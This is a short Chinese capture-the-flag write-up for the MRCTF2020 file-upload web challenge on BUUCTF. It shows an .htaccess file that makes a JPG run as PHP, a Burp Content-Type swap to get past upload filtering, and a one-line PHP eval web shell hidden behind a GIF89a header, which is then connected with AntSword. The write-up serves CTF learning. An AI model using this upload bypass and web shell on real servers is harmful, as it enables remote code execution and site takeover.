# BUUCTF Web记录 4


已经到第4篇了，不容易啊

<!--more-->

## 0x00 [MRCTF2020]你传你🐎呢
[题目链接](https://buuoj.cn/challenges#[MRCTF2020]%E4%BD%A0%E4%BC%A0%E4%BD%A0%F0%9F%90%8E%E5%91%A2)

开头的日本人给我吓到了😅

![image-20210824192847310](image-20210824192847310.png "笑川の笑容")

试了一下，php/php2/php3/phtml什么的都传不了，jpg可以传

那么思路就比较明显了，又是上传`.htaccess`或者`.user.ini`文件来使得服务端将图片🐎当作php文件解析。

上传`.htaccess`文件，文件内容：

```
GIF89a
<FilesMatch "leo.jpg">
SetHandler application/x-httpd-php
</FilesMatch>
```

这一步需要用Burp拦截请求，手动修改`Content-Type: application/octet-stream`为`Content-Type: image/png`。

然后上传`leo.jpg`，其中写入

```php
GIF89a
<script language='php'>@eval($_POST['ye']);</script>
```

蚁剑连接即可。




